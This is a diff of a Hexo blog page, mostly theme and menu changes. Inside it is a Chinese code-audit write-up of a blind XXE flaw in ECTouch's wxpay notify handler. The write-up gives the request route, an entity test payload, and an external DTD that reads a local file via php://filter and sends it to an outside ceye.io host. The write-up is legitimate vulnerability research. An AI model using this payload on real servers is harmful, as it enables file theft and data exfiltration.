@@ -203,6 +203,26 @@
         </li>
       
         
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
         <li class="menu-item menu-item-archives">
           <a href="/archives/" rel="section">
             
@@ -341,10 +361,10 @@
 <p>另外由于在notify方法并未对数据进行输出，因此该漏洞为bind xxe，为了测试方便，我们先将数据进行输出。<br><img src="https://i.loli.net/2019/02/02/5c55a2a7bfdff.png" alt></p>
 <p>下面便是构造payload，看看如何才能执行到这里。<br>ectouch采用MVC模式，入口文件index.php中包含了/include/bootstrap.php<br><img src="https://i.loli.net/2019/02/02/5c55a3313e722.png" alt><br>继续跟进，62行看到路由解析函数urlRoute<br><img src="https://i.loli.net/2019/02/02/5c55a3a45ed89.png" alt></p>
 <p>最终定位到display方法<br><img src="https://i.loli.net/2019/02/02/5c55a45d1454d.png" alt><br>获取到其模块控制器方法，分别使用吗m,c,a传入<br><img src="https://i.loli.net/2019/02/02/5c55a4a492646.png" alt></p>
-<p>至此便可构造pyload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?m=default&amp;c=respond&amp;a=index&amp;code=wxpay&amp;type=notify</span><br><span class="line"></span><br><span class="line">post</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY xxe &quot;xxe test&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
+<p>至此便可构造pyload<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?m=default&amp;c=respond&amp;a=index&amp;code=wxpay&amp;type=notify</span><br><span class="line"></span><br><span class="line">post</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe "xxe test"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>至此xxe漏洞确实存在了，但如何利用这个bind xxe呢，总不能让其自己加上输出语句吧。<br><img src="https://i.loli.net/2019/02/02/5c55a5e401841.png" alt></p>
-<p>使用payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/xxe.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p>
-<p>上面payload中外部dtd文件 xxe.dtd内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///f:/data.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://ay82rc.ceye.io/?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>使用payload<br><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0"?&gt;</span> </span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE convert [ </span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">remote</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">127.0.0.1</span>/<span class="attr">xxe.dtd</span>"&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="perl">%remote;%int;%send;</span><span class="xml"></span></span><br><span class="line"><span class="xml">]&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>上面payload中外部dtd文件 xxe.dtd内容为<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file<span class="built_in"> SYSTEM </span><span class="string">"php://filter/read=convert.base64-encode/resource=file:///f:/data.txt"</span>&gt;</span><br><span class="line">&lt;!ENTITY % int <span class="string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://ay82rc.ceye.io/?p=%file;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure></p>
 <p>成功读到数据</p>
 <p><img src="https://i.loli.net/2019/02/02/5c55b21ec99da.png" alt></p>
 <p>参考<a href="http://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">一篇文章带你理解漏洞之 XXE 漏洞</a></p>
@@ -365,7 +385,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+            <a href="/tags/代码审计/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
           
         </div>
       
@@ -467,7 +487,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-count">36</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -477,10 +497,10 @@
               
               
               <div class="site-state-item site-state-categories">
-                
+                <a href="/categories/index.html">
                   <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
-                
+                </a>
               </div>
             
 
@@ -488,10 +508,10 @@
               
               
               <div class="site-state-item site-state-tags">
-                
-                  <span class="site-state-item-count">13</span>
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">tags</span>
-                
+                </a>
               </div>
             
 
@@ -542,7 +562,8 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
@@ -552,6 +573,11 @@
 </div>
 
 
+  <div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
   <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
 
 
